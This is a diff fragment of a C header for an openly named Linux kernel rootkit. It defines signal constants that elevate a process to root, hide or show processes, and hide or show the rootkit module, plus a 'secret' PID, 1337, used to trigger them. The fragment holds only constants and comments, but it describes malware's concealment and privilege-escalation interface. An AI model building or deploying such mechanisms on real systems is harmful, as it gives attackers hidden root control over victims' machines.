@@ -17,16 +17,18 @@ extern const string_t S_HIDDEN_PREFIXES[]; // Prefixes for hidden files/director
 
 #define MOD_ALIAS ".rootkit" /* Module alias (to check if rootkit is already loaded) */
 
-#define SIGROOT 42 /* Elevate the current process to root */
-#define SIGHIDE 43 /* Hide the process with the given PID */
-#define SIGSHOW 44 /* Show the process with the given PID */
-#define SIGAUTH 45 /* Authorize the process with the given PID */
+#define SIGROOT    42 /* Elevate the current process to root */
+#define SIGHIDE    43 /* Hide the process with the given PID */
+#define SIGSHOW    44 /* Show the process with the given PID */
+#define SIGAUTH    45 /* Authorize the process with the given PID */
+#define SIGMODHIDE 46 /* Hide the rootkit */
+#define SIGMODSHOW 47 /* Show the rootkit */
 
 #define PID_SELF (pid_t)0        /* PID of the current process */
 #define PID_ANY  (pid_t) INT_MIN /* Any PID */
 #define SIG_ANY  INT_MIN         /* Any signal */
 
-#define PID_SECRET_ROOT (pid_t)1337 /* Secret PID that has to be used when sending SIGROOT */
+#define PID_SECRET (pid_t)1337 /* Secret PID that has to be used when sending some signals */
 
 #define ROOT_UID (uid_t)0 /* The root user ID */
 #define ROOT_GID (gid_t)0 /* The root group ID */
